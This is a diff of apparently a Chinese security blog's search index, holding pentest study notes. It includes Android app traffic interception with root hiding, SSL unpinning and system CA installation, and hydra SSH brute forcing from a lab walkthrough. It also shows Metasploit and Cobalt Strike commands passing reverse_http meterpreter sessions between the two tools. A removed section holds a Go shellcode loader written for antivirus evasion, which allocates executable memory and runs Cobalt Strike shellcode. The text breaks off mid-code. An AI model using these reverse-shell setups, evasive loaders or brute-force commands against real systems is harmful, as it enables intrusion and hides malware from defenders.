-<p>ssh <a class="link" href="mailto:&#x66;&#108;&#97;&#103;&#x34;&#x40;&#x31;&#x39;&#50;&#x2e;&#x31;&#54;&#56;&#x2e;&#49;&#x32;&#x34;&#46;&#55;&#54;">&#x66;&#108;&#97;&#103;&#x34;&#x40;&#x31;&#x39;&#50;&#x2e;&#x31;&#54;&#56;&#x2e;&#49;&#x32;&#x34;&#46;&#55;&#54;<i class="fas fa-external-link-alt"></i></a></p>
+<p>ssh <a class="link" href="mailto:&#x66;&#108;&#x61;&#103;&#52;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#49;&#x32;&#x34;&#46;&#55;&#54;">&#x66;&#108;&#x61;&#103;&#52;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#49;&#x32;&#x34;&#46;&#55;&#54;<i class="fas fa-external-link-alt"></i></a></p>
 <img src="1503868-20191008194735795-928890603.png" alt>
 
 <p> </p>
@@ -2638,7 +2638,7 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
 <p>做完这个感觉自己真的很菜，在此总结一下这个过程中了解到的，学到的，以及还不懂的知识</p>
 <p>1.arp-scan -l 　　用来扫描局域网内的主机。（参考<a class="link" href="https://blog.csdn.net/weixin_43221560/article/details/90550294">https://blog.csdn.net/weixin_43221560/article/details/90550294<i class="fas fa-external-link-alt"></i></a>）</p>
 <p>2.用 msf5来reach drupal寻找漏洞，配置并使用这些漏洞（一知半解，还得好好学习），</p>
-<p>3.ssh远程连接，如在渗透过程中使用到的  ssh <a class="link" href="mailto:&#x66;&#108;&#97;&#x67;&#x34;&#x40;&#49;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#x2e;&#49;&#x32;&#x34;&#x2e;&#x37;&#x36;">&#x66;&#108;&#97;&#x67;&#x34;&#x40;&#49;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#x2e;&#49;&#x32;&#x34;&#x2e;&#x37;&#x36;<i class="fas fa-external-link-alt"></i></a>。挺方便的</p>
+<p>3.ssh远程连接，如在渗透过程中使用到的  ssh <a class="link" href="mailto:&#x66;&#x6c;&#97;&#103;&#x34;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#49;&#x32;&#x34;&#x2e;&#55;&#54;">&#x66;&#x6c;&#97;&#103;&#x34;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#49;&#x32;&#x34;&#x2e;&#55;&#54;<i class="fas fa-external-link-alt"></i></a>。挺方便的</p>
 <p>4.john the Ripper +hydra 爆破，（john下载安装参考<a class="link" href="https://blog.csdn.net/Romanticduan/article/details/81233479">https://blog.csdn.net/Romanticduan/article/details/81233479<i class="fas fa-external-link-alt"></i></a>，使用参考<a class="link" href="https://blog.csdn.net/qq_36119192/article/details/83373895">https://blog.csdn.net/qq_36119192/article/details/83373895<i class="fas fa-external-link-alt"></i></a>）</p>
 <p>hydra -l flag4 -P /root/john-1.8.0/run/password.lst ssh://192.168.124.76（也是一知半解，同样得学）</p>
 <p>5.suid提权</p>
@@ -2964,6 +2964,159 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
 <p>3.为 Redis 添加密码验证</p>
 <p>4.禁止外网访问 Redis</p>
 <p>5.保证 authorized_keys 文件的安全</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>app 杂项笔记</title>
+    <url>/2023/04/09/app-%E6%9D%82%E9%A1%B9%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<p>记录一下折腾app的一些过程与奇奇怪怪的问题</p>
+<h1 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h1><ul>
+<li><p>小米6一台（已root）</p>
+<ul>
+<li>termux(0.118.0)</li>
+</ul>
+</li>
+<li><p>adb(1.0.36(nox夜神模拟器里的))</p>
+</li>
+<li><p>magisk 版本25.2(25200)</p>
+<ul>
+<li>模块（启动Zygisk）：<ul>
+<li>Shamiko(root隐藏)</li>
+<li>Zygisk-LSPosed(LSPosed)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>LSPosed(1.8.6(6712)-Zygisk,API版本93)</p>
+<ul>
+<li>模块<ul>
+<li>隐藏应用列表(3.1.1 root隐藏)</li>
+<li>JustTrustMe(.2)</li>
+<li>SSLUnpinning(1.0.0)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Frida (16.0.11)</p>
+</li>
+<li><p>Objection (1.11.0)</p>
+</li>
+<li><p>HttpCanary (v3.3.5)</p>
+</li>
+</ul>
+<h1 id="各种安装过程"><a href="#各种安装过程" class="headerlink" title="各种安装过程"></a>各种安装过程</h1><h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>咕咕</p>
+<h2 id="termux"><a href="#termux" class="headerlink" title="termux"></a>termux</h2><p>安卓下的shell终端。具体可以参考：</p>
+<p><a class="link" href="https://www.sqlsec.com/2018/05/termux.html">https://www.sqlsec.com/2018/05/termux.html<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="面具Magisk"><a href="#面具Magisk" class="headerlink" title="面具Magisk"></a>面具Magisk</h2><p>咕咕</p>
+<h3 id="Shamiko"><a href="#Shamiko" class="headerlink" title="Shamiko"></a>Shamiko</h3><p>Shamiko的github地址</p>
+<p><a class="link" href="https://github.com/LSPosed/LSPosed.github.io/releases">https://github.com/LSPosed/LSPosed.github.io/releases<i class="fas fa-external-link-alt"></i></a></p>
+<p>下载zip，在magisk中导入即可刷入Shamiko模块，重启手机，打开面具右上角设置，打开遵循排除列表选项，再点击配置排除列表。打开排除配置列表后，勾选要隐藏root的应用，<strong>然后关闭排除列表选项</strong>。如果不关闭排除列表选项，那么Shamiko模块就会不工作，隐藏root就会不生效，所以是必须关闭的，首次配置建议重启一次手机，已达到最佳的隐藏效果。</p>
+<p>关于新版本magisk隐藏root，可以看：<a class="link" href="https://zhuanlan.zhihu.com/p/506203078">https://zhuanlan.zhihu.com/p/506203078<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="Zygisk-LSPosed"><a href="#Zygisk-LSPosed" class="headerlink" title="Zygisk-LSPosed"></a>Zygisk-LSPosed</h3><p>在magisk设置中直接打开即可</p>
+<h2 id="LSPosed"><a href="#LSPosed" class="headerlink" title="LSPosed"></a>LSPosed</h2><p>咕咕</p>
+<h3 id="隐藏应用列表-3-1-1-root隐藏"><a href="#隐藏应用列表-3-1-1-root隐藏" class="headerlink" title="隐藏应用列表(3.1.1 root隐藏)"></a>隐藏应用列表(3.1.1 root隐藏)</h3><p>直接在LSPosed里面搜索下载就行，需要先加载一下（时间可能比较久）</p>
+<p><img src="image-20230409204941305.png" alt="image-20230409204941305"></p>
+<h3 id="JustTrustMe-2"><a href="#JustTrustMe-2" class="headerlink" title="JustTrustMe(.2)"></a>JustTrustMe(.2)</h3><p>JustTrustMe需要在github中下载：<a class="link" href="https://github.com/Fuzion24/JustTrustMe">https://github.com/Fuzion24/JustTrustMe<i class="fas fa-external-link-alt"></i></a></p>
+<p>安装apk即可</p>
+<h3 id="SSLUnpinning-1-0-0"><a href="#SSLUnpinning-1-0-0" class="headerlink" title="SSLUnpinning(1.0.0)"></a>SSLUnpinning(1.0.0)</h3><p>同样直接搜索即可</p>
+<p><img src="image-20230409205004795.png" alt="image-20230409205004795"></p>
+<h2 id="Frida"><a href="#Frida" class="headerlink" title="Frida"></a>Frida</h2><p>安装客户端（win10电脑上的）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install frida</span><br><span class="line">pip install frida-tools</span><br></pre></td></tr></table></figure>
+
+<p>然后 pip list|findstr frida 找到安装的frida版本.</p>
+<p><img src="image-20230409213449135.png" alt="image-20230409213449135"></p>
+<p>比如我这里是16.0.11。然后就去<a class="link" href="https://github.com/frida/frida/releases%E6%89%BE%E5%88%B0%E5%AF%B9%E5%BA%94%E7%9A%84%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%89%88%E6%9C%AC%E4%B8%8B%E8%BD%BD%E5%8D%B3%E5%8F%AF">https://github.com/frida/frida/releases找到对应的服务端版本下载即可<i class="fas fa-external-link-alt"></i></a></p>
+<p><img src="image-20230409213749429.png" alt="image-20230409213749429"></p>
+<p><img src="image-20230409213819759.png" alt="image-20230409213819759"></p>
+<p>可以使用 adb shell getprop ro.product.cpu.abi 确定手机系统架构</p>
+<p><img src="image-20230409213933394.png" alt="image-20230409213933394"></p>
+<p>下载解压后，使用adb将frida-server放到手机目录/data/local/，然后修改属性为可执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#查看设备连接状态</span><br><span class="line">adb devices -l</span><br><span class="line"></span><br><span class="line">#把服务端推送到手机的指定目录（记得先解压再推送）</span><br><span class="line">adb  push  Downloads\frida-server-16.0.11-android-arm64  &#x2F;sdcard&#x2F;</span><br><span class="line"></span><br><span class="line">#进入手机终端，修改文件权限并运行</span><br><span class="line">adb shell</span><br><span class="line"></span><br><span class="line"># 获取root权限,移动frida服务端到&#x2F;data&#x2F;local&#x2F;目录下</span><br><span class="line">su</span><br><span class="line">cp &#x2F;sdcard&#x2F;frida-server-16.0.11-android-arm64 &#x2F;data&#x2F;local&#x2F;</span><br><span class="line">cd &#x2F;data&#x2F;local</span><br><span class="line"></span><br><span class="line"># 修改权限</span><br><span class="line">chmod 777 frida-server-16.0.11-android-arm64</span><br><span class="line"></span><br><span class="line"># 后台启动（方便退出shell）</span><br><span class="line">.&#x2F;frida-server-16.0.11-android-arm64 &amp;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20230409214543417.png" alt="image-20230409214543417"></p>
+<p>随后usb连接电脑与手机输入 frida-ps -Ua</p>
+<p>有类似返回即可</p>
+<p><img src="image-20230409214633967.png" alt="image-20230409214633967"></p>
+<h2 id="Objection"><a href="#Objection" class="headerlink" title="Objection"></a>Objection</h2><p>pip install objection即可</p>
+<h2 id="Fiddler-classic"><a href="#Fiddler-classic" class="headerlink" title="Fiddler classic"></a>Fiddler classic</h2><p>下载：<a class="link" href="https://www.telerik.com/">https://www.telerik.com<i class="fas fa-external-link-alt"></i></a></p>
+<p><img src="image-20230409210332490.png" alt="image-20230409210332490"></p>
+<p>Fiddler Classic（经典版），这个版本是<strong>免费</strong>的，不过只能在Windows上使用。</p>
+<p>Fiddler Everywhere可以在所有平台使用，并且相当于Fiddler Classic+postman，但是是<strong>收费</strong>的。</p>
+<p>如果只作为抓包工具经典版就够用了，可以直接点击下方链接前往下载页面。</p>
+<p>邮箱和地址随便填就行了</p>
+<p>fiddler使用教程可以看：</p>
+<p><a class="link" href="https://juejin.cn/post/7021763777460699150">https://juejin.cn/post/7021763777460699150<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" href="https://www.cnblogs.com/hong-fithing/p/7582947.html">https://www.cnblogs.com/hong-fithing/p/7582947.html<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h2><h3 id="burp证书"><a href="#burp证书" class="headerlink" title="burp证书"></a>burp证书</h3><ol>
+<li>获取证书</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">挂上代理后，访问 https://burp 下载证书，即 cacert.der。</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>将证书转换为移动设备用户凭据文件（Ubuntu 16.04）</li>
+</ol>
+<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 转换为 *.pem 文件</span></span><br><span class="line">root<span class="variable">@cj</span><span class="symbol">:~</span><span class="comment"># openssl x509 -inform DER -in cacert.der -out cacert.pem</span></span><br><span class="line"><span class="comment"># 回显某一 hash 值</span></span><br><span class="line">root<span class="variable">@cj</span><span class="symbol">:~</span><span class="comment"># openssl x509 -inform PEM -subject_hash_old -in cacert.pem |head -1</span></span><br><span class="line">9a5ba575</span><br><span class="line"><span class="comment"># 将 *.pem 重命名为 &lt;hash&gt;.0</span></span><br><span class="line">root<span class="variable">@cj</span><span class="symbol">:~</span><span class="comment"># mv cacert.pem 9a5ba575.0</span></span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>安装证书(手机已Root)</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将 &lt;hash&gt;.0 传到手机</span></span><br><span class="line">adb push 9a5ba575.0 /sdcard/</span><br><span class="line"><span class="comment"># adb连接至设备</span></span><br><span class="line">adb shell</span><br><span class="line"><span class="comment"># shell获取root权限</span></span><br><span class="line">su</span><br><span class="line"><span class="comment"># 系统重新挂载</span></span><br><span class="line">mount -o rw,remount /</span><br><span class="line">mount -o rw,remount /system</span><br><span class="line"><span class="comment"># 复制 &lt;hash&gt;.0 </span></span><br><span class="line">cp /sdcard/9a5ba575.0 /system/etc/security/cacerts/</span><br><span class="line"><span class="comment"># 授权，644 rw-r--r--，本用户有可读可写权限，群组有只读权限，其他用户为只读权限。</span></span><br><span class="line">chmod 644 /system/etc/security/cacerts/9a5ba575.0</span><br><span class="line"><span class="comment"># 重启手机</span></span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20230409205716080.png" alt="image-20230409205716080"></p>
+<ol start="4">
+<li>验证</li>
+</ol>
+<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">设置-&gt;安全性和位置信息-&gt;加密与凭据-&gt;信任的凭据（显示信任的CA证书）-&gt;系统-&gt;PortSwigger</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20230409205900977.png" alt="image-20230409205900977"></p>
+<h3 id="Fillder证书"><a href="#Fillder证书" class="headerlink" title="Fillder证书"></a>Fillder证书</h3><ol>
+<li>获取证书</li>
+</ol>
+<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">两种方式：</span><br><span class="line"><span class="number">1</span>) 挂上代理 http:<span class="comment">//&lt;本机ip&gt;:8888 下载证书，点击 FiddlerRoot certificate 进行下载，即 FiddlerRoot.cer。</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>）Fiddler-&gt;Tools-&gt;Options-&gt;HTTPS-&gt;Actions-&gt;Export Root Certificate to Desktop,将 FiddlerRoot.cer证书导出至桌面。</span><br><span class="line">(如果Export Root Certificate to Desktop按钮是灰色的，需要点击下面的Decrypt HTTPS traffic)</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>将证书转换为移动设备用户凭据文件（Ubuntu 16.04）</li>
+</ol>
+<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@cj</span><span class="symbol">:~</span><span class="comment"># openssl x509 -inform DER -in FiddlerRoot.cer -out F.pem</span></span><br><span class="line">root<span class="variable">@cj</span><span class="symbol">:~</span><span class="comment"># openssl x509 -inform PEM -subject_hash_old -in F.pem |head -1</span></span><br><span class="line">269953fb</span><br><span class="line">root<span class="variable">@cj</span><span class="symbol">:~</span><span class="comment"># mv F.pem 269953fb.0</span></span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>安装证书(手机已Root)</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb push 269953fb.0 /sdcard/</span><br><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">mount -o rw,remount /</span><br><span class="line">mount -o rw,remount /system</span><br><span class="line">cp /sdcard/269953fb.0 /system/etc/security/cacerts/</span><br><span class="line">chmod 644 /system/etc/security/cacerts/269953fb.0</span><br><span class="line">reboot</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20230409211627886.png" alt="image-20230409211627886"></p>
+<ol start="4">
+<li>验证</li>
+</ol>
+<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">设置-&gt;安全性和位置信息-&gt;加密与凭据-&gt;信任的凭据（显示信任的CA证书）-&gt;系统-&gt;DO_NOT_TRUST_FiddlerRoot</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20230409211803361.png" alt="image-20230409211803361"></p>
+<ol start="5">
+<li>抓包配置</li>
+</ol>
+<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">Fiddler-&gt;Tools-&gt;Connecttions-&gt;Allow remote computers to conect</span><br></pre></td></tr></table></figure>
+
+<p><img src="1702434-20200804102944950-1222750935.png" alt="img"></p>
+<h1 id="问题1：本地转发抓包"><a href="#问题1：本地转发抓包" class="headerlink" title="问题1：本地转发抓包"></a>问题1：本地转发抓包</h1><p>把burp设置成系统代理后，抓到一个app的包，但是host地址是127.0.0.1:3000</p>
+<p><img src="image-20230409224824561.png" alt="image-20230409224824561"></p>
+<p>查看发现是app启动的端口：</p>
+<p><img src="image-20230409224929423.png" alt="image-20230409224929423"></p>
+<p>但是我在电脑上是访问不到这个端口的</p>
+<p><img src="image-20230409225039386.png" alt="image-20230409225039386"></p>
+<p>经过学长指导，决定用ssh转发获取返回包</p>
+<p>termux安装ssh</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 换源</span><br><span class="line">sed -i &#39;s@^\(deb.*stable main\)$@#\1\ndeb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;termux&#x2F;termux-packages-24 stable main@&#39; $PREFIX&#x2F;etc&#x2F;apt&#x2F;sources.list</span><br><span class="line"></span><br><span class="line">sed -i &#39;s@^\(deb.*games stable\)$@#\1\ndeb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;termux&#x2F;game-packages-24 games stable@&#39; $PREFIX&#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;game.list</span><br><span class="line"></span><br><span class="line">sed -i &#39;s@^\(deb.*science stable\)$@#\1\ndeb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;termux&#x2F;science-packages-24 science stable@&#39; $PREFIX&#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;science.list</span><br><span class="line"></span><br><span class="line"># 更新</span><br><span class="line">pkg update</span><br><span class="line"></span><br><span class="line"># 安装ssh</span><br><span class="line">pkg install openssh</span><br><span class="line"></span><br><span class="line"># 打开ssh</span><br><span class="line">sshd</span><br><span class="line"></span><br><span class="line"># 创建密码</span><br><span class="line">passwd</span><br></pre></td></tr></table></figure>
+
+<p>手机上的ssh默认端口是8022，需要注意下，下图就是登录成功的界面</p>
+<p><img src="image-20230409225627594.png" alt="image-20230409225627594"></p>
+<p>在测试可以登录后，就可以开始监听了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -L 30000:127.0.0.1:30000 root@192.168.0.3 -p 8022</span><br></pre></td></tr></table></figure>
+
+<p>其中192.168.0.3是手机的ip地址，127.0.0.1:30000是转发的目的地址机器端口，30000是本地一个闲置端口（这个可以任意取，但是我为了方便，即让抓来的包不做任何修改就可以直接发送并获取返回包，就改成了这个）。</p>
+<p><img src="image-20230409230215711.png" alt="image-20230409230215711"></p>
+<p>现在我在burp上抓到包后，直接send，就可以有返回包了</p>
+<p><img src="image-20230409231834652.png" alt="image-20230409231834652"></p>
+<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p>app抓包：<a class="link" href="https://mp.weixin.qq.com/s/xDvxKJPdqf7AfJSfuWHZ0g">https://mp.weixin.qq.com/s/xDvxKJPdqf7AfJSfuWHZ0g<i class="fas fa-external-link-alt"></i></a><br>新版magisk隐藏root：<a class="link" href="https://zhuanlan.zhihu.com/p/506203078">https://zhuanlan.zhihu.com/p/506203078<i class="fas fa-external-link-alt"></i></a><br>Android 8.1 导入Burp、Fiddler证书: <a class="link" href="https://www.cnblogs.com/cijian9000/p/13431754.html">https://www.cnblogs.com/cijian9000/p/13431754.html<i class="fas fa-external-link-alt"></i></a><br>frida(hook工具)的环境搭建：<a class="link" href="https://www.cnblogs.com/tjp40922/p/11353808.html">https://www.cnblogs.com/tjp40922/p/11353808.html<i class="fas fa-external-link-alt"></i></a><br>Fiddler抓包(下载安装及使用)：<a class="link" href="https://juejin.cn/post/7021763777460699150">https://juejin.cn/post/7021763777460699150<i class="fas fa-external-link-alt"></i></a><br>Termux 高级终端安装使用配置教程：<a class="link" href="https://www.sqlsec.com/2018/05/termux.html">https://www.sqlsec.com/2018/05/termux.html<i class="fas fa-external-link-alt"></i></a><br>彻底搞懂SSH端口转发命令：<a class="link" href="https://zhuanlan.zhihu.com/p/148825449">https://zhuanlan.zhihu.com/p/148825449<i class="fas fa-external-link-alt"></i></a></p>
 ]]></content>
   </entry>
   <entry>
@@ -14108,6 +14261,17 @@ Windows的一个功能允许红队或攻击者将服务隐藏起来，从而为�
 ]]></content>
   </entry>
   <entry>
+    <title>cs、msf相互派生</title>
+    <url>/2021/07/07/cs%E3%80%81msf%E7%9B%B8%E4%BA%92%E6%B4%BE%E7%94%9F/</url>
+    <content><![CDATA[<h2 id="MSF下的会话传给CS"><a href="#MSF下的会话传给CS" class="headerlink" title="MSF下的会话传给CS"></a>MSF下的会话传给CS</h2><p>msf使用注入模块 + cs创建Listener监听 （相同payload）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">set DisablePayloadHandler true</span><br><span class="line">set lhost (cs listener ip)</span><br><span class="line">set lport (cs listener port)</span><br><span class="line">set session (id)</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="CS下的会话传给MSF"><a href="#CS下的会话传给MSF" class="headerlink" title="CS下的会话传给MSF"></a>CS下的会话传给MSF</h2><p>使用msf监听模块，ip就是kali的ip，端口就是监听的端口，payload要和cs需要派生的会话相同，然后运行，开始监听</p>
+<p>cs创建一个listener，payload为Foreign HTTP，ip也是kali的ip端口和kali监听端口一样<br>右击要传的会话，点击Spawn，选择foregin http那个listense<br>等它执行完命令，msf就会出现一个meterpreter</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http  </span><br><span class="line">set lhost (cs listener ip)</span><br><span class="line">   set lport (cs listener port)</span><br><span class="line">   </span><br><span class="line">   run</span><br></pre></td></tr></table></figure>]]></content>
+  </entry>
+  <entry>
     <title>docker学习笔记</title>
     <url>/2020/08/04/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13430934.html">源地址：https://www.cnblogs.com/This-is-Y/p/13430934.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -14211,43 +14375,6 @@ Windows的一个功能允许红队或攻击者将服务隐藏起来，从而为�
 ]]></content>
   </entry>
   <entry>
-    <title>cs、msf相互派生</title>
-    <url>/2021/07/07/cs%E3%80%81msf%E7%9B%B8%E4%BA%92%E6%B4%BE%E7%94%9F/</url>
-    <content><![CDATA[<h2 id="MSF下的会话传给CS"><a href="#MSF下的会话传给CS" class="headerlink" title="MSF下的会话传给CS"></a>MSF下的会话传给CS</h2><p>msf使用注入模块 + cs创建Listener监听 （相同payload）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">set DisablePayloadHandler true</span><br><span class="line">set lhost (cs listener ip)</span><br><span class="line">set lport (cs listener port)</span><br><span class="line">set session (id)</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="CS下的会话传给MSF"><a href="#CS下的会话传给MSF" class="headerlink" title="CS下的会话传给MSF"></a>CS下的会话传给MSF</h2><p>使用msf监听模块，ip就是kali的ip，端口就是监听的端口，payload要和cs需要派生的会话相同，然后运行，开始监听</p>
-<p>cs创建一个listener，payload为Foreign HTTP，ip也是kali的ip端口和kali监听端口一样<br>右击要传的会话，点击Spawn，选择foregin http那个listense<br>等它执行完命令，msf就会出现一个meterpreter</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http  </span><br><span class="line">set lhost (cs listener ip)</span><br><span class="line">   set lport (cs listener port)</span><br><span class="line">   </span><br><span class="line">   run</span><br></pre></td></tr></table></figure>]]></content>
-  </entry>
-  <entry>
-    <title>go免杀笔记</title>
-    <url>/2022/07/29/go%E5%85%8D%E6%9D%80%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<p>参考：<br><a class="link" href="https://geektutu.com/post/quick-golang.html">https://geektutu.com/post/quick-golang.html<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://www.freebuf.com/sectool/328982.html">https://www.freebuf.com/sectool/328982.html<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://github.com/awsaaaq/GoBP">https://github.com/awsaaaq/GoBP<i class="fas fa-external-link-alt"></i></a></p>
-<h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>go读取shellcode，这里用的cs的x64 raw</p>
-<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">read</span><span class="params">(file <span class="keyword">string</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">	data, _ := ioutil.ReadFile(file)</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	shellcode := read(<span class="string">&quot;./64.bin&quot;</span>)</span><br><span class="line">	fmt.Println(shellcode)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// [252 72 131 228 13 212 67 250 25 171 144 13 92 …………………… 195 232 127 253 255 255 49 55 50 46 50 52 46 49 57 52 46 49 50 49 0 25 105 160 141 160 141]</span></span><br></pre></td></tr></table></figure>
-
-<p>shellcode loader</p>
-<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;syscall&quot;</span></span><br><span class="line">	<span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	MEM_COMMIT             = <span class="number">0x1000</span></span><br><span class="line">	MEM_RESERVE            = <span class="number">0x2000</span></span><br><span class="line">	PAGE_EXECUTE_READWRITE = <span class="number">0x40</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	kernel32      = syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">	ntdll         = syscall.MustLoadDLL(<span class="string">&quot;ntdll.dll&quot;</span>)</span><br><span class="line">	VirtualAlloc  = kernel32.MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line">	RtlCopyMemory = ntdll.MustFindProc(<span class="string">&quot;RtlCopyMemory&quot;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">read</span><span class="params">(file <span class="keyword">string</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">	data, _ := ioutil.ReadFile(file)</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	shellcode := read(<span class="string">&quot;./64.bin&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// go loader</span></span><br><span class="line">	addr, _, _ := VirtualAlloc.Call(<span class="number">0</span>, <span class="keyword">uintptr</span>(<span class="built_in">len</span>(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line">	_, _, _ = RtlCopyMemory.Call(addr, (<span class="keyword">uintptr</span>)(unsafe.Pointer(&amp;shellcode[<span class="number">0</span>])), <span class="keyword">uintptr</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">	syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<p>更多人用的都是下面这样的loader,不过我不知道这两个if判断有什么实用性，就把它们给删了</p>
-<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">addr, _, err := VirtualAlloc.Call(<span class="number">0</span>, <span class="keyword">uintptr</span>(<span class="built_in">len</span>(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">	syscall.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">_, _, err = RtlCopyMemory.Call(addr, (<span class="keyword">uintptr</span>)(unsafe.Pointer(&amp;shellcode[<span class="number">0</span>])), <span class="keyword">uintptr</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">	